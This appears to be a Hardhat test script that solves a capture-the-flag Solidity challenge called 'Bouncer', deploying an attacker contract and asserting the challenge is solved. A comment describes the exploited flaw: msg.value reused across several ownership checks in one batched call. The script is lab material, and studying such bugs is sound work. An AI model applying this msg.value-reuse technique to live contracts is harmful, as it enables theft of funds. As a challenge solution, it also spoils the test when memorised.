const { expect } = require("chai");

async function getChallenge() {
  const [deployer, player] = await ethers.getSigners();
  const setupFactory = await ethers.getContractFactory(`contracts/bouncer/public/contracts/Setup.sol:Setup`);
  const setup = await setupFactory.deploy({value: ethers.parseEther("100")});
  return { setup, player };
}

// The bouncer contract's convertMany() function checks proofOfOwnership() individually using the same `msg.value`, so we can 
// convert multiple entries in a single transaction using a single payment.

it("Solves Bouncer", async function () {
  const { setup, player } = await getChallenge();

  const attackerFactory = await ethers.getContractFactory(`contracts/bouncer/public/contracts/BouncerAttacker.sol:BouncerAttacker`);
  const attacker = await attackerFactory.connect(player).deploy(await setup.getAddress());
  await attacker.deposit({value: ethers.parseEther(`2`)});
  await attacker.attack({value: ethers.parseEther(`100`)});

  expect(await setup.isSolved()).to.equal(true);
});
